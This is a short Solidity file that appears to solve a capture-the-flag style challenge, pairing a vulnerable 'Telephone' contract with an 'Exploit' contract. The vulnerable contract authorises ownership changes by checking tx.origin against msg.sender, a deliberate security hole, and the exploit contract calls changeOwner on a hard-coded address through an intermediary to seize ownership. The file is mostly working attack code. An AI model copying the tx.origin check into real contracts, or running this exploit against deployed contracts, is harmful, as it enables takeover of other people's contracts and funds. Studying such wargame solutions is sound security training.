// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Exploit {
    Telephone tp;
    address public owner;

    constructor() public {
        owner = msg.sender;
        tp = Telephone(0x61c36a8d610163660E21a8b7359e1Cac0C9133e1);
    }

    function exploit() public {
        tp.changeOwner(msg.sender);
    }
}
